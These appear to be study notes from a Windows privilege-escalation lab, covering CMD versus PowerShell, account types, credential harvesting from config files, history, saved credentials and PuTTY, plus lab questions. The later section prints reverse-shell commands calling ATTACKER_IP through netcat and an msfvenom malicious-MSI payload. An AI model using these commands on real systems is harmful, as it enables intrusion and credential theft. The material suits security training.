During a penetration test, you will often have access to some Windows hosts with an unprivileged user. Unprivileged users will hold limited access, including their files and folders only, and have no means to perform administrative tasks on the host, preventing you from having complete control over your target.

Simply put, privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a weakness in the target system. While we will usually want "user B" to have administrative rights, there might be situations where we'll need to escalate into other unprivileged accounts before actually getting administrative privileges.

Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:
- Misconfigurations on Windows services or scheduled tasks
- Excessive privileges assigned to our account
- Vulnerable software
- Missing Windows security patches

## **PowerShell & CMD**
PowerShell and Command Prompt (CMD) are both command-line interfaces (CLI) in Windows, but they have significant differences in terms of functionality, features, and design philosophy. Here's a breakdown of the key differences:
### 1. **Purpose and Design Philosophy**

- **CMD (Command Prompt):**
    - CMD, also known as Command Prompt or cmd.exe, is the original command-line interface in Windows. It is based on MS-DOS, and its primary purpose is to execute commands, run batch scripts (.bat files), and manage basic system tasks.
    - CMD is relatively simple and is focused on executing commands and running simple scripts.
    
- **PowerShell:**
    - PowerShell is a more advanced and modern CLI and scripting environment developed by Microsoft. It is designed to provide a more powerful and flexible tool for system administration and automation.
    - PowerShell is built on the .NET framework and integrates deeply with Windows, allowing users to manage system tasks, automate processes, and work with complex data types.
### 2. **Commands and Scripting**

- **CMD:**
    - CMD uses a basic set of commands inherited from MS-DOS, such as `dir`, `copy`, `del`, and `cd`. The command set is limited and primarily focused on file and directory management.
    - CMD supports batch scripting, which is straightforward but limited in terms of capabilities compared to modern scripting languages.
    - 
- **PowerShell:**
    - PowerShell uses cmdlets (pronounced "command-lets"), which are specialized .NET classes that perform a specific function. Examples include `Get-Process`, `Get-Service`, `Set-Item`, and `Invoke-Command`.
    - PowerShell scripting is far more advanced, supporting functions, loops, conditional statements, error handling, and working with complex data structures like objects, arrays, and hash tables.
### 3. **Data Handling**

- **CMD:**
    - CMD treats everything as plain text. When you run commands, the output is typically text-based, and manipulating complex data types is challenging.
- **PowerShell:**
    - PowerShell treats output as objects, not just text. This means you can pipe the output of one cmdlet to another cmdlet and manipulate it as objects with properties and methods, allowing for much more powerful and flexible operations.
### 4. **Pipelines**

- **CMD:**
    - CMD supports pipelines (using `|`), but since everything is text-based, the output of one command is just text passed to the next command. This can limit the complexity of operations.
- **PowerShell:**
    - PowerShell's pipeline passes objects between cmdlets, enabling much more sophisticated data manipulation and allowing users to perform complex tasks in a streamlined manner.
### 5. **Usability and Extensibility**

- **CMD:**
    - CMD is simpler and may be easier to use for basic tasks. However, it lacks many features that are standard in more modern shells.
    - Extensibility is limited, and it doesn’t integrate well with other modern Windows tools or environments.
- **PowerShell:**
    - PowerShell is highly extensible. You can create custom cmdlets, modules, and functions. It also integrates with a wide range of Microsoft products (like Active Directory, Exchange, etc.) and third-party tools, making it a powerful tool for administrators.
    - PowerShell ISE (Integrated Scripting Environment) provides a more user-friendly environment for writing, testing, and debugging scripts.
### 6. **Cross-Platform Support**

- **CMD:**
    - CMD is exclusive to Windows and does not support cross-platform usage.
- **PowerShell:**
    - PowerShell Core, an open-source version of PowerShell, is cross-platform and can be used on Windows, macOS, and Linux. This makes it more versatile for managing diverse environments.

## Windows Users
Windows systems mainly have two kinds of users. Depending on their access levels, we can categories a user in one of the following groups:
- **Administrators**: These users have the most privileges. They can change any system configuration parameter and access any file in the system.
- **Standard Users**: These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files.

Any user with administrative privileges will be part of the **Administrators** group. On the other hand, standard users are part of the **Users** group. 

In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:
- **SYSTEM / LocalSystem**: 
An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.  
- **Local Service**:
Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.  
- **Network Service**:  
Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.\

*Note:*
	These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.

## **Harvesting Passwords from Usual Spots**
The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.
### Unattended Windows Installation
When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf (sysprep represents the place from where windows ISO image is mounted for the other machines)
- C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:
```shell-session
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell History
Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a `cmd.exe` prompt:
```shell-session
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

*Note:*
	The command above will only work from *cmd.exe*, as *Powershell* won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.


### Saved Windows Credentials
Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:
```shell-session
cmdkey /list
```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.
```shell-session
runas /savecred /user:admin cmd.exe
```


### IIS Configuration
Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find `web.config` in one of the following locations:

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:
```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Retrieve Credentials from Software: PuTTY
PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

*Note:* 
	Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

Q)A password for the julia.jones user has been left on the Powershell history. What is the password?
	`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
	
	![[Pasted image 20240826203911.png]]

Q)A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?
	`shell-session type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`
	
	![[Pasted image 20240826204056.png]]

Q)There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.
	`shell-session runas /savecred /user:mike.katz cmd.exe`
	![[Pasted image 20240826204231.png]]

Q)Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?
```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

## **Other Quick Wins**
Privilege escalation is not always a challenge. Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access. It would help if you considered these to belong more to the realm of CTF events rather than scenarios you will encounter during real penetration testing engagements. However, if none of the previously mentioned methods works, you can always go back to these.

### Scheduled Tasks
Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.

Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
```shell-session
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`:
```shell-session
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

As can be seen in the result, the **BUILTIN\Users** group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, `nc64.exe` can be found on `C:\tools`. Let's change the bat file to spawn a reverse shell:
```shell-session
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

We then start a listener on the attacker machine on the same port we indicated on our reverse shell:
```shell-session
nc -lvp 4444
```

### AlwaysInstallElevated
Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

This method requires two registry values to be set. You can query these from the command line using the commands below.
```shell-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Note:
	To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using `msfvenom`, as seen below:
```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
Command Prompt
```shell-session
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
